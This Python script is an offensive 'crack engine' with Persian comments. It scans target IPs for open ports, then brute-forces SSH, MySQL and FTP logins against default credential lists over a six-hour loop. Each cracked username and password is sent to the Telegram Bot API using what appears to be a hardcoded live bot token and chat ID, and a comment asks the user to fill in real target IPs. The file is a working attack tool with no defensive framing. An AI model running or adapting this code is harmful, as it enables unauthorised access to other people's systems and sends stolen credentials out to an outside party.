#!/usr/bin/env python3
# brody_6h_fixed.py - No root, pure Python socket scanner

import subprocess, threading, time, json, os, sys, socket
from datetime import datetime
import logging
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import paramiko
import pymysql

# ---------- Telegram ----------
TOKEN = os.environ.get("TELEGRAM_TOKEN", "8608061868:AAHEEsZPOw8vq100WyyusF3QjTlBvTq9-Iw")
ADMIN = os.environ.get("ADMIN_CHAT_ID", "7963634461")

# ---------- Config ----------
TARGETS = ["192.168.1.1", "10.0.0.1"]  # آی‌پی‌های واقعی رو بذار
PORTS = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5900, 8080, 8443]
TIMEOUT = 1.5
OUTPUT = "/tmp/brody_6h"
os.makedirs(OUTPUT, exist_ok=True)

# ---------- Logging ----------
logging.basicConfig(level=logging.INFO, format='[Brody] %(asctime)s - %(message)s')
log = logging.getLogger("Brody6H")

# ---------- Reporter ----------
class Reporter:
    def __init__(self):
        self.base = f"https://api.telegram.org/bot{TOKEN}"
        self.chat = ADMIN
        self.last_hb = 0

    def send(self, text):
        try:
            requests.post(f"{self.base}/sendMessage", json={"chat_id": self.chat, "text": text, "parse_mode": "Markdown"}, timeout=3)
        except Exception as e:
            log.error(f"Telegram send error: {e}")

    def heartbeat(self, cycle, found):
        now = time.time()
        if now - self.last_hb < 600: return
        self.last_hb = now
        msg = f"❤️‍🔥 *Brody 6H Cycle {cycle}*\n⏱ {datetime.now().strftime('%H:%M:%S')}\n🔹 Found: {found}\n🔹 Scanning..."
        self.send(msg)

    def crack_report(self, ip, port, service, creds):
        msg = f"🔓 *CRACKED!*\nIP: `{ip}`\nPort: `{port}`\nService: `{service}`\nCreds: `{creds}`"
        self.send(msg)

reporter = Reporter()

# ---------- Pure Python Scanner ----------
def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        result = sock.connect_ex((ip, port))
        sock.close()
        return (ip, port, result == 0)
    except:
        return (ip, port, False)

def run_scan():
    log.info("Scanning with pure Python sockets...")
    open_ports = []
    ips = [x.strip() for x in TARGETS if x.strip()]
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(scan_port, ip, port): (ip, port) for ip in ips for port in PORTS}
        for future in as_completed(futures):
            ip, port, is_open = future.result()
            if is_open:
                open_ports.append({'ip': ip, 'port': port})
                log.info(f"Open: {ip}:{port}")
    return open_ports

# ---------- SSH Brute Force (Paramiko) ----------
def brute_ssh(hosts):
    ssh_hosts = [h for h in hosts if h['port'] == 22]
    users = ['root', 'admin', 'ubuntu', 'pi', 'user']
    passes = ['root', 'admin', 'password', '123456', 'toor', 'qwerty']
    for item in ssh_hosts:
        ip = item['ip']
        for u in users:
            for p in passes:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=u, password=p, timeout=3)
                    ssh.close()
                    reporter.crack_report(ip, 22, 'ssh', f"{u}:{p}")
                    return  # بعد از پیدا شدن، دیگه تست نکن
                except:
                    pass

# ---------- MySQL Brute Force (PyMySQL) ----------
def brute_mysql(hosts):
    mysql_hosts = [h for h in hosts if h['port'] == 3306]
    creds = [('root', ''), ('root', 'root'), ('mysql', 'mysql'), ('admin', 'admin')]
    for item in mysql_hosts:
        ip = item['ip']
        for u, p in creds:
            try:
                conn = pymysql.connect(host=ip, user=u, password=p, timeout=3)
                conn.close()
                reporter.crack_report(ip, 3306, 'mysql', f"{u}:{p}")
                return
            except:
                pass

# ---------- FTP Brute (Telnet style) ----------
def brute_ftp(hosts):
    ftp_hosts = [h for h in hosts if h['port'] == 21]
    creds = [('anonymous', ''), ('ftp', 'ftp'), ('admin', 'admin')]
    for item in ftp_hosts:
        ip = item['ip']
        for u, p in creds:
            try:
                import ftplib
                ftp = ftplib.FTP(ip)
                ftp.login(u, p)
                ftp.quit()
                reporter.crack_report(ip, 21, 'ftp', f"{u}:{p}")
                return
            except:
                pass

# ---------- Main Loop (6 Hours) ----------
def main():
    start = time.time()
    duration = 6 * 3600
    cycle = 0
    total_found = 0

    log.info("🚀 Brody 6H Engine started (no root)")
    reporter.send("🔥 Brody 6-Hour Crack Engine initialized (socket-based)")

    while time.time() - start < duration:
        cycle += 1
        log.info(f"Cycle {cycle} started")
        reporter.heartbeat(cycle, total_found)

        # ۱. اسکن با سوکت
        open_hosts = run_scan()

        # ۲. کرک SSH
        brute_ssh(open_hosts)

        # ۳. کرک MySQL
        brute_mysql(open_hosts)

        # ۴. کرک FTP
        brute_ftp(open_hosts)

        # ۵. sleep تا ۱۰ دقیقه بعد
        elapsed = time.time() - start
        if elapsed < duration:
            sleep_time = min(600, duration - elapsed)
            log.info(f"Sleeping {sleep_time}s until next cycle")
            time.sleep(sleep_time)

    reporter.send("✅ *6-Hour Session Complete*\n🔹 Total cycles: " + str(cycle))
    log.info("Session finished")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        reporter.send("🛑 Stopped by user")
        sys.exit(0)
    except Exception as e:
        reporter.send(f"💀 Fatal: {e}")
        log.critical(f"Fatal: {e}")
        sys.exit(1)
